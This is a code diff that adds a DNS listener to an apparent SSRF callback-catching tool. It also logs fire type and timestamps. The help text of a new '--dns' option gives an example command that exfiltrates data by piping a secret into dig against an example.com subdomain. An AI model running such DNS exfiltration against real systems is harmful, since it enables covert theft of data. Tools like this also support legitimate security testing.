@@ -1,9 +1,15 @@
 import argparse
-from server import app, start_listener, db, print_fire
-from models import Target, Fire
 from sqlalchemy import exc
+from db import db, create_db
+from server import app
 
 targets = {}
+
+create_db(app)
+from models import Target, Fire
+
+from dnslistener import start_server as startdns
+from server import start_listener, print_fire
 
 def create_parser():
     parser = argparse.ArgumentParser(description='HTTP listener for SSRF fires.')
@@ -11,6 +17,8 @@ def create_parser():
     parser.add_argument('-d', '--target-domain', nargs='?', help='The domain of the to be added target. It\'s optional, but becomes useful when a payload fires after a a weeks of delay.', default=None)
     parser.add_argument('-sf', '--show-fires', nargs='?', const=25)
     parser.add_argument('-st', '--show-targets', nargs='?', const=25)
+    parser.add_argument('-dns', '--dns', nargs=1, help='Domain that you control that has NS records pointing to this machine. eg. dns.example.com. Then, if you want to exfiltrate data from the server use payload.target.dns.example.com. Example exfiltration method: SECRET=$(echo "secret") | dig $SECRET.target123.dns.example.com')
+    parser.add_argument('-nh', '--no-http')
     args = parser.parse_args()
     return args
 
@@ -18,7 +26,7 @@ def show_fires(last=25):
     fires = Fire.query.limit(last).all()
     print('[*][*] Fires')
     for fire in fires:
-        print_fire(fire.target.name, fire.target.domain, fire.payload, fire.headers)
+        print_fire(fire.date.strftime("%Y-%m-%d %H:%M"), fire.target.name, fire.target.domain, 'DNS' if fire.dns_fire else 'HTTP', fire.payload, fire.headers)
     return fires
 
 def show_targets(last=25):
@@ -54,4 +62,7 @@ if __name__ == "__main__":
         show_fires(args.show_fires)
     if args.show_targets:
         show_targets(args.show_targets)
-    start_listener()
+    if args.dns:
+        startdns(args.dns[0])
+    if args.no_http is None:
+        start_listener()
